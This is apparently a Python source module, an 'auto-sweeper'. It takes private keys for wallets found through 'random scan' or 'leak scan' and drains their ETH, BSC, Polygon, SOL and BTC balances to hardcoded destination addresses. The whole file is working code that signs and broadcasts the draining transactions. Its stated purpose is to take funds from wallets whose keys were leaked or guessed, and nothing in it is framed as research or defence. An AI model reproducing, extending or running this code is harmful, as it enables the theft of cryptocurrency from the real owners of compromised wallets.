"""Auto-sweeper — transfer found balances to configured wallet addresses.

When a wallet with balance > 0 is discovered (via random scan, leak scan, etc.),
the sweeper automatically transfers all funds to the user's configured wallets.

Supports: ETH/BSC/Polygon (web3), BTC (blockstream API + raw tx), SOL (solana-py).

Usage:
    sweeper = Sweeper()
    result = await sweeper.sweep_if_funded(address, chain, private_key)
"""

from __future__ import annotations

import logging
from dataclasses import dataclass
from typing import Optional

import httpx

from src.modules.crypto.balance.chains import ChainConfig, ChainType

logger = logging.getLogger(__name__)

_TIMEOUT = 30

# --- Destination wallets ---
DESTINATION_WALLETS = {
    "solana": "4FRKaVCCHzewoi8wekgXYGDh8Tq6GLJegwE18SDcePzZ",
    "ethereum": "0x5cFa8609b0Ca0f65C6672A93Aa94F6132Ad6894F",
    "bnb smart chain": "0x5cFa8609b0Ca0f65C6672A93Aa94F6132Ad6894F",
    "polygon": "0x5cFa8609b0Ca0f65C6672A93Aa94F6132Ad6894F",
    "arbitrum": "0x5cFa8609b0Ca0f65C6672A93Aa94F6132Ad6894F",
    "optimism": "0x5cFa8609b0Ca0f65C6672A93Aa94F6132Ad6894F",
    "base": "0x5cFa8609b0Ca0f65C6672A93Aa94F6132Ad6894F",
    "avalanche": "0x5cFa8609b0Ca0f65C6672A93Aa94F6132Ad6894F",
    "fantom": "0x5cFa8609b0Ca0f65C6672A93Aa94F6132Ad6894F",
    "bitcoin": "bc1q6lds3gc8aress470tygqp8wu5t03jv4yu3tx3e",
}


@dataclass
class SweepResult:
    """Result of a sweep attempt."""

    success: bool
    chain: str
    source_address: str
    dest_address: str
    amount: float
    amount_raw: int
    tx_hash: Optional[str] = None
    error: Optional[str] = None


class Sweeper:
    """Auto-sweeper for transferring found balances to configured wallets."""

    def __init__(self, client: Optional[httpx.AsyncClient] = None):
        self._client = client
        self._created_client = False

    async def _get_client(self) -> httpx.AsyncClient:
        if self._client is None:
            self._client = httpx.AsyncClient(timeout=_TIMEOUT)
            self._created_client = True
        return self._client

    async def close(self) -> None:
        if self._created_client and self._client:
            await self._client.aclose()
            self._client = None

    def get_destination(self, chain_name: str) -> Optional[str]:
        """Get the destination wallet address for a chain."""
        return DESTINATION_WALLETS.get(chain_name.lower())

    async def sweep(
        self,
        private_key_hex: str,
        chain: ChainConfig,
        source_address: str,
        balance_raw: int,
    ) -> SweepResult:
        """Sweep all funds from a wallet to the configured destination.

        Args:
            private_key_hex: Hex-encoded private key (without 0x prefix).
            chain: Chain configuration.
            source_address: Source wallet address.
            balance_raw: Raw balance in smallest unit (wei, satoshi, lamports).

        Returns:
            SweepResult with transaction details.
        """
        dest = self.get_destination(chain.name)
        if not dest:
            return SweepResult(
                success=False,
                chain=chain.name,
                source_address=source_address,
                dest_address="",
                amount=0,
                amount_raw=0,
                error=f"No destination wallet configured for {chain.name}",
            )

        if balance_raw <= 0:
            return SweepResult(
                success=False,
                chain=chain.name,
                source_address=source_address,
                dest_address=dest,
                amount=0,
                amount_raw=0,
                error="Zero balance, nothing to sweep",
            )

        # Skip dust balances that can't cover fees
        _MIN_BALANCE = {
            ChainType.SOLANA: 1000000,  # 0.001 SOL
            ChainType.EVM: 5000000000000000,  # 0.005 ETH
            ChainType.BITCOIN: 5000,  # 0.00005 BTC
        }
        min_bal = _MIN_BALANCE.get(chain.chain_type, 0)
        if balance_raw < min_bal:
            return SweepResult(
                success=False,
                chain=chain.name,
                source_address=source_address,
                dest_address=dest,
                amount=balance_raw / (10**chain.decimals),
                amount_raw=balance_raw,
                error=f"Dust balance ({balance_raw / (10**chain.decimals):.9f} {chain.symbol}), below minimum sweep threshold",
            )

        try:
            if chain.chain_type == ChainType.EVM:
                return await self._sweep_evm(private_key_hex, chain, source_address, dest, balance_raw)
            elif chain.chain_type == ChainType.SOLANA:
                # Check if account is system-owned before sweep
                if not await self._is_solana_system_account(source_address, chain):
                    return SweepResult(
                        success=False,
                        chain=chain.name,
                        source_address=source_address,
                        dest_address=dest,
                        amount=balance_raw / 1e9,
                        amount_raw=balance_raw,
                        error="Program-owned account (not System Program) — cannot sweep",
                    )
                return await self._sweep_sol(private_key_hex, chain, source_address, dest, balance_raw)
            elif chain.chain_type == ChainType.BITCOIN:
                return await self._sweep_btc(private_key_hex, chain, source_address, dest, balance_raw)
            else:
                return SweepResult(
                    success=False,
                    chain=chain.name,
                    source_address=source_address,
                    dest_address=dest,
                    amount=0,
                    amount_raw=0,
                    error=f"Unsupported chain type: {chain.chain_type}",
                )
        except Exception as e:
            logger.error("Sweep failed for %s on %s: %s", source_address[:10], chain.name, e)
            return SweepResult(
                success=False,
                chain=chain.name,
                source_address=source_address,
                dest_address=dest,
                amount=0,
                amount_raw=0,
                error=str(e),
            )

    async def _sweep_evm(
        self,
        private_key_hex: str,
        chain: ChainConfig,
        source: str,
        dest: str,
        balance_raw: int,
    ) -> SweepResult:
        """Sweep EVM chain (ETH/BSC/Polygon) using web3.py."""
        from web3 import Web3

        w3 = Web3(Web3.HTTPProvider(chain.rpc_url))

        # Get gas price and estimate gas
        gas_price = w3.eth.gas_price
        gas_limit = 21000  # Standard ETH transfer
        gas_cost = gas_price * gas_limit

        # Leave enough for gas
        amount_to_send = balance_raw - gas_cost
        if amount_to_send <= 0:
            return SweepResult(
                success=False,
                chain=chain.name,
                source_address=source,
                dest_address=dest,
                amount=0,
                amount_raw=0,
                error=f"Insufficient balance for gas (need {gas_cost / 10**18:.6f} {chain.symbol})",
            )

        # Build transaction
        nonce = w3.eth.get_transaction_count(w3.to_checksum_address(source))
        tx = {
            "nonce": nonce,
            "to": dest,
            "value": amount_to_send,
            "gas": gas_limit,
            "gasPrice": gas_price,
            "chainId": w3.eth.chain_id,
        }

        # Sign and send
        signed = w3.eth.account.sign_transaction(tx, private_key_hex)
        tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
        tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)

        amount = amount_to_send / (10**chain.decimals)
        return SweepResult(
            success=tx_receipt["status"] == 1,
            chain=chain.name,
            source_address=source,
            dest_address=dest,
            amount=amount,
            amount_raw=amount_to_send,
            tx_hash=tx_hash.hex(),
        )

    async def _is_solana_system_account(self, address: str, chain: ChainConfig) -> bool:
        """Check if a Solana account is owned by the System Program."""
        import httpx

        try:
            async with httpx.AsyncClient(timeout=10) as client:
                payload = {
                    "jsonrpc": "2.0",
                    "id": 1,
                    "method": "getAccountInfo",
                    "params": [address, {"encoding": "base64"}],
                }
                rpc_url = chain.rpc_url or ""
                resp = await client.post(rpc_url, json=payload)
                data = resp.json()
                value = data.get("result", {}).get("value")
                if value is None:
                    return False  # Account doesn't exist
                owner = value.get("owner", "")
                # System Program = 11111111111111111111111111111111
                return owner == "11111111111111111111111111111111"
        except Exception:
            return True  # Assume system-owned on error (let sweep attempt)

    async def _sweep_sol(
        self,
        private_key_hex: str,
        chain: ChainConfig,
        source: str,
        dest: str,
        balance_raw: int,
    ) -> SweepResult:
        """Sweep SOL using solders + httpx (fully async)."""
        import base64 as _b64

        from solders.hash import Hash
        from solders.keypair import Keypair
        from solders.message import Message
        from solders.pubkey import Pubkey
        from solders.system_program import transfer
        from solders.transaction import Transaction

        # Derive keypair from private key bytes
        key_bytes = bytes.fromhex(private_key_hex)
        if len(key_bytes) == 64:
            keypair = Keypair.from_bytes(key_bytes)
        else:
            keypair = Keypair.from_seed(key_bytes[:32])

        client = await self._get_client()
        rpc = chain.rpc_url or "https://api.mainnet-beta.solana.com"

        source_pubkey = Pubkey.from_string(source)
        dest_pubkey = Pubkey.from_string(dest)

        # Get recent blockhash via httpx
        resp = await client.post(
            rpc,
            json={
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getLatestBlockhash",
                "params": [{"commitment": "finalized"}],
            },
        )
        bh_str = resp.json()["result"]["value"]["blockhash"]
        blockhash = Hash.from_string(bh_str)

        fee = 5000
        rent_exempt = 890880  # Solana minimum rent-exempt balance
        amount_to_send = balance_raw - fee - rent_exempt
        if amount_to_send <= 0:
            return SweepResult(
                success=False,
                chain=chain.name,
                source_address=source,
                dest_address=dest,
                amount=0,
                amount_raw=0,
                error=f"Insufficient balance for fee ({fee} lamports)",
            )

        # Regular transfer — works for both nonce and non-nonce accounts
        ix = transfer(
            {
                "from_pubkey": source_pubkey,
                "to_pubkey": dest_pubkey,
                "lamports": amount_to_send,
            }
        )
        msg = Message.new_with_blockhash([ix], keypair.pubkey(), blockhash)
        txn = Transaction.new_unsigned(msg)
        txn.sign([keypair], blockhash)

        # Send via httpx (preflight ON to catch errors early)
        encoded = _b64.b64encode(bytes(txn)).decode()
        resp = await client.post(
            rpc,
            json={
                "jsonrpc": "2.0",
                "id": 2,
                "method": "sendTransaction",
                "params": [
                    encoded,
                    {"encoding": "base64", "skipPreflight": False, "maxRetries": 3},
                ],
            },
        )
        result = resp.json()
        if "error" in result:
            return SweepResult(
                success=False,
                chain=chain.name,
                source_address=source,
                dest_address=dest,
                amount=amount_to_send / 1e9,
                amount_raw=amount_to_send,
                error=f"Send failed: {result['error']}",
            )

        tx_hash = result["result"]

        # Wait for confirmation (up to 30 seconds)
        import asyncio as _aio

        for _ in range(6):
            await _aio.sleep(5)
            status_resp = await client.post(
                rpc,
                json={
                    "jsonrpc": "2.0",
                    "id": 3,
                    "method": "getSignatureStatuses",
                    "params": [[tx_hash], {"searchTransactionHistory": True}],
                },
            )
            status_data = status_resp.json()
            statuses = status_data.get("result", {}).get("value", [])
            if statuses and statuses[0]:
                conf = statuses[0].get("confirmationStatus", "")
                err = statuses[0].get("err")
                if err:
                    return SweepResult(
                        success=False,
                        chain=chain.name,
                        source_address=source,
                        dest_address=dest,
                        amount=amount_to_send / 1e9,
                        amount_raw=amount_to_send,
                        tx_hash=tx_hash,
                        error=f"TX failed on-chain: {err}",
                    )
                if conf in ("confirmed", "finalized"):
                    amount = amount_to_send / 1e9
                    return SweepResult(
                        success=True,
                        chain=chain.name,
                        source_address=source,
                        dest_address=dest,
                        amount=amount,
                        amount_raw=amount_to_send,
                        tx_hash=tx_hash,
                    )

        # Timed out waiting for confirmation
        return SweepResult(
            success=False,
            chain=chain.name,
            source_address=source,
            dest_address=dest,
            amount=amount_to_send / 1e9,
            amount_raw=amount_to_send,
            tx_hash=tx_hash,
            error="TX sent but confirmation timed out (may still land)",
        )

    async def _sweep_btc(
        self,
        private_key_hex: str,
        chain: ChainConfig,
        source: str,
        dest: str,
        balance_raw: int,
    ) -> SweepResult:
        """Sweep BTC using the `bit` library."""
        import asyncio as _asyncio

        from bit import PrivateKey as BtcPrivateKey

        def _do_btc_sweep():
            key = BtcPrivateKey.from_hex(private_key_hex)
            # Get unspents from blockstream API
            api = chain.api_url or "https://blockstream.info/api"
            resp = httpx.get(f"{api}/address/{source}/utxo", timeout=_TIMEOUT)
            if resp.status_code != 200:
                raise RuntimeError(f"Failed to fetch UTXOs: HTTP {resp.status_code}")
            utxos = resp.json()
            if not utxos:
                raise RuntimeError("No UTXOs found")

            # Get fee estimate
            try:
                fee_resp = httpx.get(f"{api}/fee-estimates", timeout=_TIMEOUT)
                fee_per_byte = fee_resp.json().get("6", 10) if fee_resp.status_code == 200 else 10
            except Exception:
                fee_per_byte = 10

            # bit library needs unspents in its format
            from bit.network.meta import Unspent

            unspents = [
                Unspent(
                    amount=u["value"],
                    confirmations=0,
                    script=bytes.fromhex("76a914") + key.address.encode() + bytes.fromhex("88ac"),
                    txid=u["txid"],
                    txindex=u["vout"],
                )
                for u in utxos
            ]
            key.unspents = unspents

            # Send with custom fee
            total_sat = sum(u["value"] for u in utxos)
            tx_size_estimate = 148 * len(utxos) + 34 * 2 + 10
            fee_sat = int(fee_per_byte * tx_size_estimate)
            amount_sat = total_sat - fee_sat
            if amount_sat <= 0:
                raise RuntimeError(f"Insufficient for fee (need ~{fee_sat} sat, have {total_sat})")

            tx_hash = key.send([(dest, amount_sat, "sat")], fee=fee_sat, absolute_fee=True)
            return tx_hash, amount_sat

        loop = _asyncio.get_event_loop()
        tx_hash, amount_sat = await loop.run_in_executor(None, _do_btc_sweep)

        return SweepResult(
            success=True,
            chain=chain.name,
            source_address=source,
            dest_address=dest,
            amount=amount_sat / 1e8,
            amount_raw=amount_sat,
            tx_hash=tx_hash,
        )
